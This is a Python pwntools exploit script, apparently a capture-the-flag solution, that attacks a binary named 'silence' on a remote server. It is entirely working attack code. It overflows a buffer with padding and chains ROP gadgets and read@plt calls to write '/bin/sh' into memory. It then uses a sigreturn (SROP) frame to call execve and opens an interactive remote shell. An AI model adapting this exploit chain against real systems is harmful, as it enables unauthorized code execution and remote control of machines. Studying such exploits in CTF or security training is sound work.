prsi_r15 = 0x4012c1 	# : pop rsi ; pop r15 ; ret
prdi = 0x4012c3 		# : pop rdi ; ret
ret = 0x40101a   		# : ret
syscall = 0x40119e 		# : syscall
read_plt = 0x401090		#  0x40123c:	call   0x401090 <read@plt>

bss = 0x404000
addr_shell = 0x404200
puts_plt = 0x401070
puts_got = 0x404018
main_addr = 0x40120d	#    0x40125a: leave

from pwn import *

context.arch = "amd64"
# p = process("./silence")
p = remote("192.81.209.60", 2023)
# gdb.attach(p)
# only run in server because stdout server different stdout local

def rdi(a):
	return p64(prdi) + p64(a)

def rsi(a):
	return p64(prsi_r15) + p64(a) + p64(0)


frame = SigreturnFrame(kernel='amd64')	# struct Sigcontext
frame.rax = 0x3b			# execve syscall number
frame.rdi = addr_shell		# address of /bin/sh string
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x40119e		# syscall gadget

padding = "A" * 0x18

payload = ''
payload += padding

# /bin/sh\x00
payload += rdi(0)
payload += rsi(addr_shell)
payload += p64(read_plt)

# 0x21 - input 0x21 char - dup2(0, 1)
payload += rdi(0)
payload += rsi(bss)
payload += p64(read_plt)

payload += rdi(0)
payload += rsi(1)
payload += p64(syscall)

# 0xf - input 0xf - SROP
payload += rdi(0)
payload += rsi(addr_shell + 0x100)
payload += p64(read_plt) # 0xf

payload += p64(syscall)
payload += bytes(frame)

x = 1

p.recvuntil(":xD")
p.sendline(payload) 
sleep(x)
p.sendline("/bin/sh\x00")
sleep(x)
p.sendline("a"*0x20)
sleep(x)
p.sendline("a"*0xe)

p.interactive()
